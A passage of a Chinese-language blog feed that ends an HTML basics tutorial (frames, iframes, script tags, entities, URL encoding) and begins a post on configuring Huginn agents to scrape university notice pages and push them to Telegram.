class="token punctuation">></span></span>Copyright W3School.com.cn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></code></pre><p>具体后面再看看 HTML5 的新语义元素吧（</p><br><h2 id="框架-1"><a href="#框架-1" class="headerlink" title="框架"></a>框架</h2><p><strong>通过使用框架，可以在同一个浏览器窗口中显示不止一个页面。</strong></p><p>每份HTML文档称为一个框架，并且每个框架都独立于其他的框架。</p><h3 id="结构框架标签-frameset"><a href="#结构框架标签-frameset" class="headerlink" title="结构框架标签 frameset"></a>结构框架标签 frameset</h3><p><code>frameset</code>标签 / 框架集</p><p>它定义了如何将窗口分割为框架。每个 <code>frameset</code> 定义了一系列 行 <strong>或</strong> 列。</p><p>rows/columns 的值规定了每行或每列占据屏幕的面积。</p><h3 id="框架标签-frame"><a href="#框架标签-frame" class="headerlink" title="框架标签 frame"></a>框架标签 frame</h3><p><code>frame</code> 标签定义了放置在每个框架中的 HTML 文档。</p><p>例如，下面这个例子定义了一个两列框架集，第一列占窗口的25%，显示<code>frame_a.htm</code>；第二列占75%，显示<code>frame_b.htm</code>。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frameset</span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>25%,75%<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>frame_a.htm<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>frame_b.htm<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>frameset</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>假如一个框架有可见边框，用户可以拖动边框来改变它的大小。为了避免这种情况发生，可以在 <code>&lt;frame&gt;</code> 标签中加入：<code>noresize="noresize"</code>。</p><p>即（此处分成两行<code>rows</code>）</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frameset</span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>25%,75%<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>frame_a.htm<span class="token punctuation">"</span></span> <span class="token attr-name">noresize</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>noresize<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>frame_b.htm<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>frameset</span><span class="token punctuation">></span></span></code></pre><h3 id="noframes-标签"><a href="#noframes-标签" class="headerlink" title="noframes 标签"></a>noframes 标签</h3><p><strong>不能将 <code>&lt;body&gt;&lt;/body&gt;</code> 标签与 <code>&lt;frameset&gt;&lt;/frameset&gt;</code>  标签同时使用！</strong></p><p>不过，假如添加包含一段文本的 <code>&lt;noframes&gt;</code> 标签，就必须将这段文字嵌套于  <code>&lt;body&gt;&lt;/body&gt;</code> 标签内。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frameset</span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>25%,50%,25%<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/html/frame_a.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/html/frame_b.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/html/frame_c.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>noframes</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>您的浏览器无法处理框架！<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>noframes</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>frameset</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><h3 id="混合框架结构"><a href="#混合框架结构" class="headerlink" title="混合框架结构"></a>混合框架结构</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frameset</span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50%,50%<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/html/frame_a.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frameset</span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>25%,75%<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/html/frame_b.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>frame</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/example/html/frame_c.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>frameset</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>frameset</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p><img src="/2020/02/14/FrontEnd_HTML_Basic/frame.png" alt="混合框架"></p><br><h2 id="内嵌框架"><a href="#内嵌框架" class="headerlink" title="内嵌框架"></a>内嵌框架</h2><p><strong><em>Iframe</em> 用于在网页内显示网页。</strong></p><p><code>height</code> 和 <code>width</code> 属性用于规定 <code>iframe</code> 的高度和宽度。</p><p>属性值的默认单位是像素，但也可以用百分比来设定（比如 “80%”）。</p><p>对于不支持<code>iframe</code>的浏览器，可以把需要的提示文本放置在 <code>&lt;iframe&gt;</code> 和 <code>&lt;/iframe&gt;</code> 之间。</p><p>比如这里嵌套了一个我的博客首页（套娃嘻嘻嘻</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://miaotony.xyz<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>600<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>400<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>您的浏览器不支持iframe唉<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span></code></pre><iframe src="https://miaotony.xyz" width="600" height="400"></iframe>---<p><code>iframe</code> 可用作链接的目标（<code>target</code>）。</p><p>链接的 <code>target</code> 属性必须引用 <code>iframe</code> 的 <code>name</code> 属性：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://miaotony.xyz<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>600<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>iframe_miao<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://miaotony.xyz/friends<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>iframe_miao<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>friends<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><iframe src="https://miaotony.xyz" width="600" height="200" name="iframe_miao"></iframe><a href="https://miaotony.xyz/friends" target="iframe_miao">friends</a><p><em>（可能部署博客的时候这里用不了</em></p><br><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p><strong>script 元素</strong></p><p><code>&lt;script&gt;</code> 标签用于定义客户端脚本，比如 JavaScript。</p><p><code>script</code> 元素既可包含脚本语句，也可通过 <code>src</code> 属性指向外部脚本文件。</p><p><code>&lt;noscript&gt;</code> 标签提供无法使用脚本时的替代内容。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">function</span> <span class="token function">sayhello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>noscript</span><span class="token punctuation">></span></span>Sorry, your browser does not support JavaScript!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>noscript</span><span class="token punctuation">></span></span></code></pre><script type="text/javascript">    function sayhello(){        alert("Hello World!");    }</script><p><noscript>Sorry, your browser does not support JavaScript!</noscript><br><button onclick="sayhello();">点这里试试呗~</button></p><p><em>后面学JavaScript再慢慢看（</em></p><br><h2 id="字符实体"><a href="#字符实体" class="headerlink" title="字符实体"></a>字符实体</h2><p><strong>HTML 中的预留字符必须被替换为字符实体。</strong></p><p>形式类似于这样</p><pre><code>&amp;entity_name;&amp;#entity_number;</code></pre><p>如 <code>&amp;lt;</code> 或 <code>&amp;#60;</code> 表示小于号 &lt; 。</p><p>不间断空格 <code>&amp;nbsp;</code></p><br><h2 id="URL-编码"><a href="#URL-编码" class="headerlink" title="URL 编码"></a>URL 编码</h2><p>URL，<em>Uniform Resource Locator</em>，统一资源定位符。</p><p>URL 只能使用 ASCII 字符集来通过因特网进行发送。</p><p><strong>URL 编码会将字符转换为可通过因特网传输的格式。</strong></p><p>它使用 “%” 其后跟随两位的十六进制数来替换非 ASCII 字符。</p><p>URL 不能包含空格。URL 编码通常使用 <code>+</code> 来替换空格。</p><p>（之前玩CTF就遇到过一个题，它的某个参数里需要输入加号（<code>+</code>），所以要写成 <code>%2b</code>。</p><p><br><br></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><strong>入门就到这里了吧</strong>emmm</p><p>虽然有点枯燥，但所见所得还是挺有趣的哈哈哈。</p><p><strong>进阶</strong>再来看看HTML的表单与输入，还有H5中的新元素，画布、音视频等等。</p><p>溜了溜了 嘻嘻嘻</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> FrontEnd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FrontEnd </tag>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | 利用Huginn&amp;TelegramBot实现教务通知自动爬取与推送</title>
      <link href="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/"/>
      <url>/2020/02/11/Idea_Huginn_AAONoticeAutoPush/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前不久在服务器上装好了Huginn（<a href="https://miaotony.xyz/2020/02/03/Server_Huginn/">详见这里：基于Docker搭建Huginn</a>）。</p><p>这几天折腾了一下，尝试着用它来爬点东西玩一下<em>（bushi</em></p><p>想了一下，平时会关注<strong>教务的通知</strong>，每次都要访问教务网站，虽然说也不是很麻烦，但我想要一个自动推送的工具。或者说，不需要我主动去看有没有新通知，而是有新通知公告了就直接推过来。（类似于Webhook？ 😃</p><p>说到这个，其实之前在 RSSHub 上看到过一个，不过现在好像失效了。考虑到目前没有折腾 RSSHub 的打算，干脆就用 Huginn 自己弄一个好了。</p><p>说干就干了啦。</p><p>哦对了，最终的效果大概这样——</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/WeChatNotification.png" alt="WeChatNotification"></p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/TG_PC.png" alt="Telegram PC端"></p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/TG_Mobile.png" alt="Telegram Mobile"></p><hr><h2 id="通知的爬取"><a href="#通知的爬取" class="headerlink" title="通知的爬取"></a>通知的爬取</h2><p>与其说专门打造一个教务通知公告的爬取，不如说记录一下 Huginn 的基本使用方法。</p><p>说实话，<strong>Huginn 的资料真的少</strong>，感觉国内都没有多少介绍这个的，于是遇到了不少问题经常不知道怎么办emmm。</p><h3 id="一些小介绍"><a href="#一些小介绍" class="headerlink" title="一些小介绍"></a>一些小介绍</h3><p>打开你喜欢的浏览器，进入 Huginn（默认为 <code>127.0.0.1:3000</code>），最上方有如下几个选项。</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/huginn_intro.png" alt="标题栏"></p><p>其中Agents就是你的一个个小兵，他们可以互相协作，按照流水线依次完成各自的使命。</p><p>Scenarios 就是这些小兵的集合，或者说是某种场景，官方描述是</p><blockquote><p>Scenarios are named groups of Agents.  Scenarios allow you to organize your agents, and to import and export sets of Agents to share.</p></blockquote><p>比如说你有A、B、C三个Agent，他们共同完成一个任务，你就可以把他们集合起来作为一个Scenario。</p><p>Events 是小兵们收集来的信息。</p><p>Credentials 用来记录一些常量，或者说是环境变量。</p><blockquote><p>Credentials are used to store values used by many Agents. Examples might include “twitter_consumer_secret”, “user_full_name”, or “user_birthday”.      </p></blockquote><p>在使用时，就可以像 <code> {% credential Meow_API %} </code> 这样来引用，其中 <code>Meow_API</code> 在 Credentials 中进行定义。</p><h3 id="大体思路"><a href="#大体思路" class="headerlink" title="大体思路"></a>大体思路</h3><p>Huginn 里有很多种 Agent，这里用到的可以说是最常用的 <strong>Website Agent</strong> 和 <strong>Post Agent</strong> 。</p><p>更多的可以参考官方 Wiki 的介绍，在<a href="https://github.com/huginn/huginn/wiki/Agent-Types-&amp;-Descriptions" target="_blank" rel="noopener">这里</a>。</p><p>这个项目的思路就是</p><ul><li>访问教务网站，爬取通知公告栏的标题及链接</li><li>根据得到的链接，访问相应网址，获得通知具体内容</li><li>将得到的信息打包，根据 Server Chan 和 Telegram Bot API 的格式发送即可</li></ul><h3 id="创建获取信息的-Agent"><a href="#创建获取信息的-Agent" class="headerlink" title="创建获取信息的 Agent"></a>创建获取信息的 Agent</h3><p><strong>Crawler_AAO #1 Get Notice URLs</strong></p><p>选择 Website Agent，界面如下：</p><p> <img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/WebsiteAgent.png" alt="Website Agent"></p><p><code>Name</code>自己取个喜欢的名字。</p><p><code>Schedule</code>可以指定运行的周期。如果列表里没有合适的选项的话，可以选择Never，再另外创建一个<strong>Scheduler Agent</strong>，以<a href="http://en.wikipedia.org/wiki/Cron" target="_blank" rel="noopener">cron</a>格式自己写一个，然后在<code>Controllers</code>里指向这个Scheduler Agent。</p><p><code>Keep events</code>可以定义获得Events后保留的时间，过期后自动会删除之前的Events。每次爬取后，获得新的数据才作为一个event，否则不会触发一个新的event，可以说在一定程度上起到了去重的作用。（当然如果还有重复的话，可以后面再加一个<strong>De-duplication Agent</strong>）</p><p>如果数据量过大的话最好不要设成<code>Forever</code>。但是要确保在下一个 Agent 能够在 Event 过期之前获取到数据。</p><p><code>Sources</code>就是上一个Agent，<code>Receivers</code>就是下一个Agent。勾选<code>Propagate immediately</code>的话，上一个Agent获取到数据后则立即执行这个Agent，否则会间隔一分钟再执行。（开启会加重CPU负担）</p><p><code>Scenarios</code>就是那个Agents的集合啦。</p><p><code>Options</code>里是具体的配置，是JSON的格式，可以参考右边的提示来进行设置。</p><p>怎么说好呢，其实简单的参数右边是有了，但是实际配置的时候还是有不少问题。看官方文档吧emmm</p><p><a href="https://huginnio.herokuapp.com/agents" target="_blank" rel="noopener">https://huginnio.herokuapp.com/agents</a> 这里有关于Agents各自API的详细介绍。</p><hr><p>下面是<code>options</code>的具体介绍。</p><p>Website Agent可以爬取来自<code>url</code>/<code>url_from_event</code>/<code>data_from_event</code>的信息。</p><h4 id="type"><a href="#type" class="headerlink" title="type"></a>type</h4><p>可以<code>xml</code>, <code>html</code>, <code>json</code>, or <code>text</code>。相应的类型有各自的介绍，这里是HTML网页，就用<code>html</code>好了。</p><h4 id="mode"><a href="#mode" class="headerlink" title="mode"></a>mode</h4><p>可以是<code>all</code>, <code>on_change</code>, or <code>merge</code>。If you specify <code>merge</code> for the <code>mode</code> option, Huginn will retain the old payload and update it with new values. </p><p>即如果选择<code>merge</code>，则会与之前的信息合并，这个在获取教务通知的具体内容时会用到，之后不再赘述。这里只需要在出现新通知的时候触发，所以用<code>on_change</code>。</p><h4 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h4><p><code>extract</code>里就是要解析的内容，可以用a CSS selector in <code>css</code> or an XPath expression in <code>xpath</code>. （如果<code>type</code>里选<code>text</code>则可以用<code>regexp</code>正则匹配，<em>然而如果要html提取后再正则匹配就需要再来一个Agent，感觉有点蠢emmm如果有更好的办法欢迎来和我交流一下哈</em>）</p><ul><li><p><strong>要注意的是：</strong>这个解析的内容是根据url浏览后<strong>直接获得的页面，没有加载文本之外的任何内容，没有经过JavaScript渲染等等</strong>。或者说就是你<code>F12</code>在<code>Network</code>里看到的页面加载出来的document或xhr之类得到的response。<em>（这个是在利用 Huginn 爬取其他网站的时候发现的）</em></p></li><li><p>如果需要爬取JavaScript加载的网页，可以使用 <strong>Phantom Js Cloud Agent</strong>，这个需要在<a href="https://phantomjscloud.com/" target="_blank" rel="noopener">PhantomJs Cloud</a>申请一个API，有一定的免费额度。这个Agent会返回页面的相应信息，还可以具体设置输出JSON、截图等等。</p></li></ul><p><code>extract</code>里以JSON格式写要解析的对象，后面就会返回 相应名字作为Key，相应的值作为Value 的JSON结果。</p><p>CSS可以这样找↓，直接<strong>复制CSS路径</strong>，再进行缩略处理。</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/css_selector.png" alt="复制css路径"></p><p>比如这里复制出来是</p><pre class=" language-css"><code class="language-css">html body div<span class="token number">.</span>container-fluid div<span class="token number">.</span>main-content<span class="token number">.</span>clearfix div<span class="token number">.</span>left-content div<span class="token number">.</span>notice-announcement div#index_notice_content<span class="token number">.</span>tab-content div<span class="token number">.</span>tab-pane<span class="token number">.</span>active ul<span class="token number">.</span>tab-pane-ul li div<span class="token number">.</span>inform-content a</code></pre><p>然后<strong>处理 css path</strong>。</p><p>原始路径过长，<strong>删去不带 <code>.</code> 或 <code>#</code> 的节点（节点间以空格“ ”分割），并删去每个节点在 <code>.</code> 或 <code>#</code>前的第一个标签</strong>，得到：</p><pre class=" language-css"><code class="language-css"><span class="token number">.</span>container-fluid <span class="token number">.</span>main-content<span class="token number">.</span>clearfix <span class="token number">.</span>left-content <span class="token number">.</span>notice-announcement #index_notice_content<span class="token number">.</span>tab-content <span class="token number">.</span>tab-pane<span class="token number">.</span>active <span class="token number">.</span>tab-pane-ul <span class="token number">.</span>inform-content a</code></pre><p>前半部分对节点定位用处不大，继续缩略，于是得到</p><pre class=" language-css"><code class="language-css"><span class="token number">.</span>tab-pane<span class="token number">.</span>active <span class="token number">.</span>tab-pane-ul <span class="token number">.</span>inform-content a</code></pre><blockquote><p><strong>非常规情况处理</strong>： </p><p>a. 有些路径中的<strong>节点带空格</strong>，如<code>&lt;div class="packery-item article"&gt;</code>,路径中的空格由<code>.</code>代替，截取为<code>.packery-item.article</code> </p><p>b. 当抓取<strong>多种 css path 规则</strong>时，用逗号<code>,</code>分割</p><pre class=" language-css"><code class="language-css"><span class="token string">"css"</span><span class="token punctuation">:</span> <span class="token string">".focus-title .current a , .stress h2 a"</span>,</code></pre></blockquote><p><code>value</code>用来提取标签中的属性，可以利用<a href="https://www.w3.org/TR/xpath/#section-String-Functions" target="_blank" rel="noopener">XPath functions</a>。（<a href="https://www.w3school.com.cn/xpath/xpath_functions.asp" target="_blank" rel="noopener">中文介绍</a>）</p><p>Xpath Functions是可以进行嵌套来用的<del>（套娃</del>（x</p><p>这里用了 <code>@href</code>来提取链接，用<code>string(.)</code>来提取这个css路径下的字符串，用 <code>normalize-space</code>函数来去除多余的空格。得到的JSON表达式如下。</p><pre class=" language-json"><code class="language-json"><span class="token property">"extract"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"css"</span><span class="token operator">:</span> <span class="token string">".tab-pane.active .tab-pane-ul .inform-content a"</span><span class="token punctuation">,</span>        <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"@href"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"css"</span><span class="token operator">:</span> <span class="token string">".tab-pane.active .tab-pane-ul .inform-content a"</span><span class="token punctuation">,</span>        <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"normalize-space(string(.))"</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="template"><a href="#template" class="headerlink" title="template"></a>template</h4><p>除了上面这些，还可以设置<strong>User Agent</strong>，以及一个用<strong>Liquid模板语言编写的模板<code>template</code></strong>等等。</p><blockquote><p>Liquid markup language. Safe, customer facing template language for flexible web apps.  </p></blockquote><p>Liquid官方仓库：<a href="https://github.com/Shopify/liquid" target="_blank" rel="noopener">https://github.com/Shopify/liquid</a>。这里有关于Liquid语法的中文介绍：<a href="https://liquid.bootcss.com/" target="_blank" rel="noopener">https://liquid.bootcss.com/</a>。</p><p>Liquid也是可以嵌套的，利用管道 <code>|</code> 可以将处理后的结果送到下一个filter。</p><p>除了Liquid自带的filter，Huginn还提供了一些自己的用法，详见官方文档 <a href="https://github.com/huginn/huginn/wiki/Formatting-Events-using-Liquid" target="_blank" rel="noopener">Formatting Events using Liquid</a>。</p><p><img src="/2020/02/11/Idea_Huginn_AAONoticeAutoPush/liquid_huginn.png" alt="Liquid Templating"></p><p>在这里，由于得到的 href 是相对地址（如 <code>/2020/0208/c11066a193409/page.htm</code>），为了得到绝对地址，在<code>template</code>中利用 <code> {{ url | to_uri: _response_.url }}</code> 进行处理。</p><p><em>（别说了，这几天找遍了XPath function和Liquid用法）</em></p><hr><p>设好之后可以点击<strong>Dry Run</strong>来试试，看看运行的结果，再做进一步的修改。</p><p>于是最终得到的<code>Crawler_AAO #1 Get Notice URLs</code> Options 如下。</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"expected_update_period_in_days"</span><span class="token operator">:</span> <span class="token string">"2"</span><span class="token punctuation">,</span>  <span class="token property">"user_agent"</span><span class="token operator">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0"</span><span class="token punctuation">,</span>  <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"http://aao.nuaa.edu.cn/"</span><span class="token punctuation">,</span>  <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"html"</span><span class="token punctuation">,</span>  <span class="token property">"mode"</span><span class="token operator">:</span> <span class="token string">"on_change"</span><span class="token punctuation">,</span>  <span class="token property">"extract"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"css"</span><span class="token operator">:</span> <span class="token string">".tab-pane.active .tab-pane-ul .inform-content a"</span><span class="token punctuation">,</span>      <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"@href"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"css"</span><span class="token operator">:</span> <span class="token string">".tab-pane.active .tab-pane-ul .inform-content a"</span><span class="token punctuation">,</span>      <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"normalize-space(string(.))"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"time"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"css"</span><span class="token operator">:</span> <span class="token string">".tab-pane.active .tab-pane-ul .inform-data"</span><span class="token punctuation">,</span>      <span class="token property">"value"</span><span class="token operator">:</span> <span class="token string">"normalize-space(.)"</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token property">"template"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"url"</span><span class="token operator">:</span> "<span class="token punctuation">{</span><span class="token punctuation">{</span> url | to_uri<span class="token operator">:</span> _response_.url <span class="token punctuation">}</span><span class="token punctuation">}</span>"  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><hr><h3 id="创建获取内容的-Agent"><a href="#创建获取内容的-Agent" class="headerlink" title="创建获取内容的 Agent"></a>创建获取内容的 Agent</h3><p><strong>Crawler_AAO #2 Get Notice Contents</strong></p><p>一样是Website Agent。</p><p><code>Sources</code>选择第一步创建的Agent，即 <strong>Crawler_AAO #1 Get Notice URLs</strong>。</p><p><code>Options</code>中的<code>url</code>就来自第一个Agent，于是可以用Liquid中的<code> {{url}} </code>。</p><p><code>mode</code> 为 <code>merge</code>，合并之前的信息作为最终的输出。当然也可以利用模板<code>template</code>以及Liquid来调用之前获取的对象。</p><p>这里再利用Liquid中的<code>strip_html</code>用法，将所有的html标签去除，最终得到的<code>content</code>就只剩包含<code>\n</code>的字符串了。（之前试了XPath Function里的<code>normalize-space</code>函数，发现所有文字都连一起了，<del>丑死了emmm</del></p><p>最终得到如下的Options。</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"expected_update_period_in_days"</span><span class="token operator">:</span> <span class="token string">"2"</span><span class="token punctuation">,</span>  <span class="token property">"user_agent"</span><span class="token operator">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0"</span><span class="token punctuation">,</span>  <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"{{url}}"</span><span class="token punctuation">,</span>  <span class="token property">"type"</span><span class="token 